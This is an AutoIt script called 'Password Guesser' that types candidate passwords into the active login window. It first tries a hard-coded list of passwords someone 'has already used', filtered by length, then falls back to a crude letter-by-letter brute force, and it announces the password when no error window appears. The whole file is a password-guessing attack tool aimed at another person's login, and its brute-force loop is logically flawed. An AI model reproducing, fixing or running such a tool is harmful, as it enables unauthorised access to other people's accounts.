#include <Array.au3>
#include <File.au3>
$a = 1
$error = 0
$nom = 0
$time = 5
$var2 = 0
$letter = 0
HotKeySet("{ESC}", "xitprog")

$nanswer = 1
While $nanswer = 1
    $nletters = InputBox("Password Guesser", "How many letters are in the word?                  (Enter ? If you don't know!)")
    If @error = 1 Then
		Exit
    Else
        ; They clicked OK, but what did they type?
        If $nletters = "?" Then
			$nanswer = 0
			$a = 0
			$guess = 1
		ElseIf $nletters > 10 Then
			MsgBox(4096, "Error", "It has to be less than 10 numbers!")
        ElseIf $nletters <1 Then
			MsgBox(4096, "Error", "It has to be at least 1 number!")
        EndIf
		If StringIsInt($nletters) Then
			$nanswer = 0
			$a = 0
			$guess =1
		EndIf
    EndIf
WEnd

 ; Make an array with previous password he has already used
Dim $avArray[7]
$avArray[0] = "today"
$avArray[1] = "real"
$avArray[2] = "test"
$avArray[3] = "sunny"
$avArray[4] = "rainy"
$avArray[5] = "practice"
$avArray[6] = "BHS"

Dim $avArray2[7]

; Test each array to see if it matches the number of letters
If $a = 1 Then
	For $var = 0 To 6 Step 1
		$ntletters = StringLen($avArray[$var2])
		If $ntletters = $nletters Then
			_ArrayInsert ($avArray2, $nom, $avArray[$var])
			$nom = $nom + 1
		EndIf
		$var2 = $var +1
	Next
EndIf

GUICreate("Password Guesser")
$Start = GUICtrlCreateButton(" GO!    ",10, 10,200)
GUICtrlCreateLabel("Hit Esc to stop at any time!", 10, 40)
GUISetState()

While $a = 1
	$msg = GUIGetMsg()
	Select
		Case $msg = $GUI_EVENT_CLOSE
			Exit
		Case $msg = $Start
			GUICtrlDelete($Start)
			While $time <> 0
				GUICtrlCreateButton(" GO!    " & $time,10, 10,200)
				WinSetTitle("Password Guesser","", $time)
				Sleep(1000)
				$bftime = $time
				$time = $time - 1
				WinSetTitle($bftime,"",$time)
				GUISetState()
			WEnd
			WinSetTitle($time, "", "Password Guesser")
			For $pwg = $nom-1 to 0 Step -1
				;Send the message to the program for testing
				Send($avArray2[$pwg])
				Send("{Enter}")
				If WinActive("Error") Then
					Send("{Enter}")
					$error = $error + 1
					If $error = $nom Then
						$guess = 1
						$a = 0
						MsgBox (0,"", "There were no matches!")
					EndIf
				Else
					;Send a message telling you what the password was
					MsgBox(0,"Yay","You have successfully loged in!" & @CRLF & "The password was: " & $avArray2[$pwg], 5)
					Exit
				EndIf
			Next
	EndSelect
WEnd

If $guess = 1 Then
	Dim $letters[26]
	$letters[0] = "a"
	$letters[1] = "b"
	$letters[2] = "c"
	$letters[3] = "d"
	$letters[4] = "e"
	$letters[5] = "f"
	$letters[6] = "g"
	$letters[7] = "h"
	$letters[8] = "i"
	$letters[9] = "j"
	$letters[10] = "k"
	$letters[11] = "l"
	$letters[12] = "m"
	$letters[13] = "n"
	$letters[14] = "o"
	$letters[15] = "p"
	$letters[16] = "q"
	$letters[17] = "r"
	$letters[18] = "s"
	$letters[19] = "t"
	$letters[20] = "u"
	$letters[21] = "v"
	$letters[22] = "w"
	$letters[23] = "x"
	$letters[24] = "y"
	$letters[25] = "z"
	$notequal = 1
	Select
		Case $nletters = 1
			Dim $avArray3[1]
			$b = 0
		Case $nletters = 2
			Dim $avArray3[2]
			$b = 1
		Case $nletters = 3
			Dim $avArray3[3]
			$b = 2
		Case $nletters = 4
			Dim $avArray3[4]
			$b = 3
		Case $nletters = 5
			Dim $avArray3[5]
			$b = 4
		Case $nletters = 6
			Dim $avArray3[6]
			$b = 5
		Case $nletters = 7
			Dim $avArray3[7]
			$b = 6
		Case $nletters = 8
			Dim $avArray3[8]
			$b = 7
		Case $nletters = 9
			Dim $avArray3[9]
			$b = 8
		Case $nletters = 10
			Dim $avArray3[10]
			$b = 9
		Case $nletters = "?"
			Dim $avArray3[10]
			$b = 9
	EndSelect
	Sleep(3000)
	
	While $notequal = 1
		For $c = 0 to $b Step 1
			For $letter = 0 To 25
				$avArray3[$c] = $letters[$letter]
				$wguess = _ArrayToString($avArray3,"")
				Send($wguess)
				Send("{Enter}")
			Next
			$letter = 0
		Next
		$notequal = 0
	WEnd
EndIf

Func xitprog()
	Exit
EndFunc